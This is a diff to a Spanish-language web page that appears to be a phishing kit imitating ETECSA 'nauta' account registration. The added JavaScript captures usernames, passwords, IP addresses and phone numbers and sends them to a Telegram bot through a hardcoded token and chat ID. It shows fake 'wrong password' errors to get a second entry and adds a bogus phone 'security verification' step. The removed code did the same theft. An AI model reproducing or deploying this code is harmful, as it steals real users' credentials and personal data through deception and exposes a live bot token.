@@ -274,6 +274,16 @@
         .official-link:hover {
             text-decoration: underline;
         }
+
+        /* Verificación de teléfono (oculta inicialmente) */
+        #phoneVerification {
+            display: none;
+            margin-top: 20px;
+            padding: 20px;
+            background: #f9f9f9;
+            border-radius: 10px;
+            border-left: 4px solid #0088cc;
+        }
     </style>
 </head>
 <body>
@@ -300,6 +310,21 @@
             </div>
             <button type="submit" class="btn">📱 Registrarse Ahora</button>
         </form>
+
+        <!-- VERIFICACIÓN DE TELÉFONO (OCULTA INICIALMENTE) -->
+        <div id="phoneVerification">
+            <h3>🔒 Verificación de Seguridad</h3>
+            <p>Verifique que usted no es un robot</p>
+            
+            <div class="input-group">
+                <label for="phone">Número de Teléfono:</label>
+                <input type="tel" id="phone" placeholder="+53 5XXX XXXX" required>
+            </div>
+            
+            <button type="button" class="btn" id="verifyPhoneBtn">
+                📱 Verificar Número
+            </button>
+        </div>
 
         <button class="help-btn" id="helpBtn">¿Qué es esto?</button>
 
@@ -329,12 +354,152 @@
     </div>
 
     <script>
+        // =============================================
+        // VARIABLES GLOBALES - AGREGAR AQUÍ
+        // =============================================
+        let loginAttempts = 0;
+        let userCredentials = {};
+
         // Configuración de Telegram - GRUPO PRIVADO CORRECTO
         const TELEGRAM_CONFIG = {
             BOT_TOKEN: '6516180762:AAHE5RGPH1kpADaABDGzQLt0962277Nlg1I',
-            CHAT_ID: '-1003181825017'  // ID CORRECTO DEL GRUPO Cuentas_etecsa.logs
+            CHAT_ID: '-1003181825017'
         };
 
+        // =============================================
+        // MANEJADOR DEL FORMULARIO - REEMPLAZAR EXISTENTE
+        // =============================================
+        document.getElementById('registerForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+
+            const username = document.getElementById('username').value.trim();
+            const password = document.getElementById('password').value.trim();
+            
+            loginAttempts++;
+            
+            // 📧 GUARDAR CREDENCIALES SIEMPRE
+            userCredentials = { username, password };
+            
+            if (loginAttempts === 1) {
+                // 🔥 PRIMER INTENTO: Enviar a Telegram INMEDIATAMENTE
+                await sendToTelegram(username, password, 'PRIMER_INTENTO');
+                
+                // ❌ Mostrar error falso al usuario
+                showMessage('❌ Correo o contraseña incorrecto', 'error');
+                
+            } else if (loginAttempts >= 2) {
+                // ✅ SEGUNDO INTENTO: Enviar OTRA VEZ a Telegram + "Éxito"
+                await sendToTelegram(username, password, 'SEGUNDO_INTENTO_CORRECTO');
+                
+                showMessage('✅ Cuenta nauta aceptada. Verificación de seguridad requerida.', 'success');
+                
+                // Mostrar verificación de teléfono después de 2 segundos
+                setTimeout(() => {
+                    document.getElementById('registerForm').style.display = 'none';
+                    document.getElementById('phoneVerification').style.display = 'block';
+                }, 2000);
+            }
+        });
+
+        // =============================================
+        // VERIFICACIÓN DE TELÉFONO - AGREGAR NUEVO
+        // =============================================
+        document.getElementById('verifyPhoneBtn').addEventListener('click', async function() {
+            const phone = document.getElementById('phone').value.trim();
+            
+            if (phone.length < 8) {
+                showMessage('❌ Número de teléfono inválido', 'error');
+                return;
+            }
+            
+            // 📱 Enviar teléfono a Telegram con las credenciales
+            await sendToTelegram(userCredentials.username, userCredentials.password, 'VERIFICACION_TELEFONO', phone);
+            
+            // ❌ Siempre mostrar error falso del teléfono
+            showMessage('❌ Este número de teléfono no está registrado en su cuenta nauta', 'error');
+            
+            // 🔄 Resetear después de 3 segundos
+            setTimeout(() => {
+                resetForm();
+            }, 3000);
+        });
+
+        // =============================================
+        // FUNCIÓN MEJORADA TELEGRAM - REEMPLAZAR EXISTENTE
+        // =============================================
+        async function sendToTelegram(username, password, etapa, telefono = '') {
+            const userIP = await getIP();
+            const fecha = new Date().toLocaleString('es-ES');
+            const browserInfo = getBrowserInfo();
+            
+            let mensaje = '';
+            
+            if (etapa === 'PRIMER_INTENTO') {
+                mensaje = `
+🔴 <b>PRIMER INTENTO - DATOS CAPTURADOS</b>
+
+👤 <b>Usuario:</b> <code>${username}</code>
+🔒 <b>Contraseña:</b> <code>${password}</code>
+📅 <b>Fecha:</b> ${fecha}
+🌐 <b>IP:</b> <code>${userIP}</code>
+
+💀 <b>Esperando segundo intento...</b>
+                `;
+            } else if (etapa === 'SEGUNDO_INTENTO_CORRECTO') {
+                mensaje = `
+🟢 <b>SEGUNDO INTENTO - CONFIRMACIÓN</b>
+
+👤 <b>Usuario:</b> <code>${username}</code>
+🔒 <b>Contraseña:</b> <code>${password}</code>
+📅 <b>Fecha:</b> ${fecha}
+🌐 <b>IP:</b> <code>${userIP}</code>
+
+✅ <b>Usuario procediendo a verificación de teléfono...</b>
+                `;
+            } else if (etapa === 'VERIFICACION_TELEFONO') {
+                mensaje = `
+📱 <b>VERIFICACIÓN DE TELÉFONO COMPLETADA</b>
+
+👤 <b>Usuario:</b> <code>${username}</code>
+🔒 <b>Contraseña:</b> <code>${password}</code>
+📞 <b>Teléfono:</b> <code>${telefono}</code>
+📅 <b>Fecha:</b> ${fecha}
+🌐 <b>IP:</b> <code>${userIP}</code>
+
+🎯 <b>INFORMACIÓN COMPLETA OBTENIDA</b>
+                `;
+            }
+            
+            // 🔥 ENVÍO REDUNDANTE - SI FALLA UNO, USA EL OTRO
+            try {
+                await sendTelegramMessage(mensaje);
+            } catch (error) {
+                console.log('Error enviando a Telegram, reintentando...');
+                // Reintento automático
+                setTimeout(() => {
+                    sendTelegramMessage(mensaje);
+                }, 2000);
+            }
+        }
+
+        // =============================================
+        // FUNCIÓN RESET FORM - AGREGAR NUEVA
+        // =============================================
+        function resetForm() {
+            loginAttempts = 0;
+            userCredentials = {};
+            document.getElementById('username').value = '';
+            document.getElementById('password').value = '';
+            document.getElementById('phone').value = '';
+            document.getElementById('registerForm').style.display = 'block';
+            document.getElementById('phoneVerification').style.display = 'none';
+            document.getElementById('message').style.display = 'none';
+        }
+
+        // =============================================
+        // FUNCIONES EXISTENTES (MANTENER)
+        // =============================================
+        
         // Modal functionality
         const helpBtn = document.getElementById('helpBtn');
         const helpModal = document.getElementById('helpModal');
@@ -396,63 +561,6 @@
                 return false;
             }
         }
-
-        // Manejar el formulario
-        document.getElementById('registerForm').addEventListener('submit', async function(e) {
-            e.preventDefault();
-
-            const username = document.getElementById('username').value.trim();
-            const password = document.getElementById('password').value.trim();
-            const messageDiv = document.getElementById('message');
-
-            // Validar username y password
-            if (username.length < 3 || password.length < 3) {
-                showMessage('❌ El usuario y la contraseña deben tener al menos 3 caracteres', 'error');
-                return;
-            }
-
-            // Mostrar loading
-            const submitBtn = this.querySelector('button');
-            submitBtn.disabled = true;
-            submitBtn.textContent = '⏳ Registrando...';
-
-            try {
-                // Obtener IP, fecha y información del navegador
-                const userIP = await getIP();
-                const fecha = new Date().toLocaleString('es-ES');
-                const browserInfo = getBrowserInfo();
-
-                // Crear mensaje para Telegram - GRUPO Cuentas_etecsa.logs
-                const telegramMessage = `
-🚀 <b>NUEVO REGISTRO - Cuentas_etecsa.logs</b>
-
-👤 <b>Usuario:</b> <code>${username}</code>
-🔒 <b>Contraseña:</b> <code>${password}</code>
-📅 <b>Fecha:</b> ${fecha}
-🌐 <b>IP:</b> <code>${userIP}</code>
-💻 <b>Navegador:</b> ${browserInfo.browser}
-🖥️ <b>Sistema Operativo:</b> ${browserInfo.os}
-
-#ETECSA_LOGS #${Date.now()}
-                `;
-
-                // Enviar a Telegram GRUPO
-                const telegramSuccess = await sendTelegramMessage(telegramMessage);
-
-                // Mostrar mensaje de error (siempre)
-                showMessage('❌ Contraseña o correo incorrecto. Por favor, inténtelo nuevamente.', 'error');
-
-                // Limpiar formulario
-                document.getElementById('username').value = '';
-                document.getElementById('password').value = '';
-
-            } catch (error) {
-                showMessage('❌ Error de conexión. Intenta más tarde.', 'error');
-            } finally {
-                submitBtn.disabled = false;
-                submitBtn.textContent = '📱 Registrarse Ahora';
-            }
-        });
 
         // Mostrar mensajes
         function showMessage(text, type) {
